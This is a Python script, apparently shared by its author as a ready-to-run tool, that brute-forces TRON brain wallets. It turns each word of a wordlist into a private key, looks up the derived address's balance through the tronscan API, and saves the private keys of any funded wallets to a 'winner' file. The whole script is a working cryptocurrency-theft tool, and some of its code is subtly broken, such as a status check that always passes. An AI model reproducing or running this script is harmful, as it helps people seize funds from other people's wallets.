# ███╗███╗   ███╗███╗   ███╗██████╗ ██████╗ ███████╗ █████╗     ██████╗ ██████╗ ███╗   ███╗███╗
# ██╔╝████╗ ████║████╗ ████║██╔══██╗██╔══██╗╚══███╔╝██╔══██╗   ██╔════╝██╔═══██╗████╗ ████║╚██║
# ██║ ██╔████╔██║██╔████╔██║██║  ██║██████╔╝  ███╔╝ ███████║   ██║     ██║   ██║██╔████╔██║ ██║
# ██║ ██║╚██╔╝██║██║╚██╔╝██║██║  ██║██╔══██╗ ███╔╝  ██╔══██║   ██║     ██║   ██║██║╚██╔╝██║ ██║
# ███╗██║ ╚═╝ ██║██║ ╚═╝ ██║██████╔╝██║  ██║███████╗██║  ██║██╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███║
# ╚══╝╚═╝     ╚═╝╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══╝
# [   Programmer Mmdrza ~ Official Website : Mmdrza.Com / Github : Github.Com/PyMmdrza        ]                                                                                            
###############################################################################################

import codecs
import hashlib
import base58
import ecdsa
import requests
from Crypto.Hash import keccak
from colorama import Fore


def keccak256(data):
    hasher = keccak.new(digest_bits=256)
    hasher.update(data)
    return hasher.digest()


def get_signing_key(raw_priv):
    return ecdsa.SigningKey.from_string(raw_priv, curve=ecdsa.SECP256k1)


def verifying_key_to_addr(key):
    pub_key = key.to_string()
    primitive_addr = b'\x41' + keccak256(pub_key)[-20:]
    # 0 (zero), O (capital o), I (capital i) and l (lower case L)
    addr = base58.b58encode_check(primitive_addr)
    return addr


# Start Color =============
Cyan = Fore.CYAN
Yellow = Fore.YELLOW
Red = Fore.RED
Green = Fore.GREEN
White = Fore.WHITE
Magenta = Fore.MAGENTA
# End Color ===============


mylist = []

with open('words.txt', newline='', encoding='utf-8') as f:
    for line in f:
        mylist.append(line.strip())


class BrainWallet:

    @staticmethod
    def generate_address_from_passphrase(passphrase):
        private_key = str(hashlib.sha256(
            passphrase.encode('utf-8')).hexdigest())
        return private_key

    @staticmethod
    def generate_address_from_private_key(private_key):
        public_key = BrainWallet.__private_to_public(private_key)
        address = BrainWallet.__public_to_address(public_key)
        return address

    @staticmethod
    def __private_to_public(private_key):
        private_key_bytes = codecs.decode(private_key, 'hex')
        key = ecdsa.SigningKey.from_string(
            private_key_bytes, curve=ecdsa.SECP256k1).verifying_key
        key_bytes = key.to_string()
        key_hex = codecs.encode(key_bytes, 'hex')
        bitcoin_byte = b'04'
        public_key = bitcoin_byte + key_hex
        return public_key

    @staticmethod
    def __public_to_address(public_key):
        public_key_bytes = codecs.decode(public_key, 'hex')
        # Run SHA256 for the public key
        sha256_bpk = hashlib.sha256(public_key_bytes)
        sha256_bpk_digest = sha256_bpk.digest()
        ripemd160_bpk = hashlib.new('ripemd160')
        ripemd160_bpk.update(sha256_bpk_digest)
        ripemd160_bpk_digest = ripemd160_bpk.digest()
        ripemd160_bpk_hex = codecs.encode(ripemd160_bpk_digest, 'hex')
        network_byte = b'00'
        network_bitcoin_public_key = network_byte + ripemd160_bpk_hex
        network_bitcoin_public_key_bytes = codecs.decode(
            network_bitcoin_public_key, 'hex')
        sha256_nbpk = hashlib.sha256(network_bitcoin_public_key_bytes)
        sha256_nbpk_digest = sha256_nbpk.digest()
        sha256_2_nbpk = hashlib.sha256(sha256_nbpk_digest)
        sha256_2_nbpk_digest = sha256_2_nbpk.digest()
        sha256_2_hex = codecs.encode(sha256_2_nbpk_digest, 'hex')
        checksum = sha256_2_hex[:8]
        address_hex = (network_bitcoin_public_key + checksum).decode('utf-8')
        wallet = BrainWallet.base58(address_hex)
        return wallet

    @staticmethod
    def base58(address_hex):
        alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
        b58_string = ''
        leading_zeros = len(address_hex) - len(address_hex.lstrip('0'))
        address_int = int(address_hex, 16)
        while address_int > 0:
            digit = address_int % 58
            digit_char = alphabet[digit]
            b58_string = digit_char + b58_string
            address_int //= 58
        ones = leading_zeros // 2
        for one in range(ones):
            b58_string = '1' + b58_string
        return b58_string


def getxbal(addr):
    block = requests.get("https://apilist.tronscan.org/api/account?address=" + addr)
    if block != 204:
        res = block.json()
        balances = dict(res)["balances"][0]["amount"]
        return balances
    else:
        return 0.000000


count = 0
start = 3
win = 0
a = 1
for i in range(0, len(mylist)):
    count += 1
    passphrase = mylist[i]
    wallet = BrainWallet()
    private_key = wallet.generate_address_from_passphrase(passphrase)
    raw = bytes.fromhex(private_key)
    key = get_signing_key(raw)
    addr = verifying_key_to_addr(key.get_verifying_key()).decode()
    priv = raw.hex()
    bal = getxbal(addr)
    if float(bal) > 0:
        win += 1
        f = open("WinnerDetailsTRX.txt", "a")
        f.write('\nAddresss: ' + str(addr) + '         BALANCE: ' + str(bal))
        f.write('\nPRIVATEKEY: ' + str(priv))
        f.write('\n-------------------------- MMDRZA.COM ---------------------------\n')
        print(Cyan, str(count), Green, str(addr), Cyan, '   BALANCE:', White, str(bal),
              White, '   PASSPHRASE: ', Cyan, str(passphrase))
    else:
        print(Cyan, str(count), Red, '  WIN:', White, str(win), Yellow, str(addr), Magenta, '   BALANCE:', White,
              str(bal),
              Yellow, '   PASSPHRASE: ', Cyan, str(passphrase))
        print(Yellow, 'Private Key : ', White, str(priv), '\n DEC : ', Red, int(priv, 16))
        print(
            '|----------------------------------------[' + White + ' M M D R Z A . C o m' + Red + ' ]----------------------------------------|')
